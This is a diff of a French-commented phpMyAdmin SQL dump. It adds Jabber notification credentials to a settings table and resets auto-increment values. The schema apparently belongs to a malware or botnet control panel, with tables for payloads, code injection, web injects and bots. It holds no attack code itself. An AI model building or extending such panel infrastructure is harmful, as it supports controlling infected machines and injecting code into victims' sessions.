@@ -3,9 +3,9 @@
 -- http://www.phpmyadmin.net
 --
 -- Client :  localhost:8889
--- Généré le :  Jeu 14 Avril 2016 à 11:04
+-- Généré le :  Ven 15 Avril 2016 à 10:48
 -- Version du serveur :  5.5.42
--- Version de PHP :  7.0.0
+-- Version de PHP :  5.6.10
 
 SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
 SET time_zone = "+00:00";
@@ -128,7 +128,7 @@ CREATE TABLE `payloads` (
   `urlverif` text NOT NULL,
   `codeinject` text NOT NULL,
   `action` int(11) NOT NULL DEFAULT '0'
-) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=latin1;
+) ENGINE=InnoDB DEFAULT CHARSET=latin1;
 
 -- --------------------------------------------------------
 
@@ -140,15 +140,18 @@ CREATE TABLE `settings` (
   `id` int(11) NOT NULL,
   `hide_panel` int(11) NOT NULL DEFAULT '0',
   `get_name` text NOT NULL,
-  `get_value` text NOT NULL
+  `get_value` text NOT NULL,
+  `jabber_username` text NOT NULL,
+  `jabber_password` text NOT NULL,
+  `jabber_to` text NOT NULL
 ) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
 
 --
 -- Contenu de la table `settings`
 --
 
-INSERT INTO `settings` (`id`, `hide_panel`, `get_name`, `get_value`) VALUES
-(1, 0, '', '');
+INSERT INTO `settings` (`id`, `hide_panel`, `get_name`, `get_value`, `jabber_username`, `jabber_password`, `jabber_to`) VALUES
+(1, 0, '', '', '', '', '');
 
 -- --------------------------------------------------------
 
@@ -162,7 +165,7 @@ CREATE TABLE `utilisateurs` (
   `password` varchar(255) NOT NULL,
   `roles` int(11) NOT NULL DEFAULT '3',
   `bot` int(11) NOT NULL DEFAULT '0'
-) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=latin1;
+) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
 
 --
 -- Contenu de la table `utilisateurs`
@@ -297,7 +300,7 @@ ALTER TABLE `logs_checker`
 -- AUTO_INCREMENT pour la table `payloads`
 --
 ALTER TABLE `payloads`
-  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=4;
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
 --
 -- AUTO_INCREMENT pour la table `settings`
 --
@@ -307,7 +310,7 @@ ALTER TABLE `settings`
 -- AUTO_INCREMENT pour la table `utilisateurs`
 --
 ALTER TABLE `utilisateurs`
-  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=5;
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=2;
 --
 -- AUTO_INCREMENT pour la table `webinject`
 --
